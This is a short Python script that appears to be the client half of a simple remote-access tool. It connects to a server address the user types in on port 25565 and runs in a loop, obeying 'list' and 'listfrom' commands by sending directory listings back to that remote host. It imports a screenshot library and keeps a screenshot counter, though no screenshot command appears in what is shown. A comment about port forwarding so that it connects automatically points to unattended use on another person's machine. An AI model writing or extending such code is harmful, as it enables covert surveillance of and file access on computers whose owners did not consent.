import os
import socket
import pyscreenshot
import sys

# Connect to server
sock = socket.socket()
host = input(str("Input server address: ")) # To automatically connect, port foward and assign to the host
port = 25565

try:
    sock.connect((host, port))
    print("Success: connected to server")
except OSError:
    print("Host not found")
    sys.exit()

# Commands
ss_num = 0

while True:
    command = sock.recv(1024)
    command = command.decode()

    if command == "list": # Show files in root (program's) directory
        files = os.listdir()
        sock.send(str(files).encode())
    
    elif command == "listfrom":
        fromdir = sock.recv(5000)
        fromdir = fromdir.decode()
        files = os.listdir(fromdir)
        sock.send(str(files).encode())

    if command == "endsession":
        sock.close()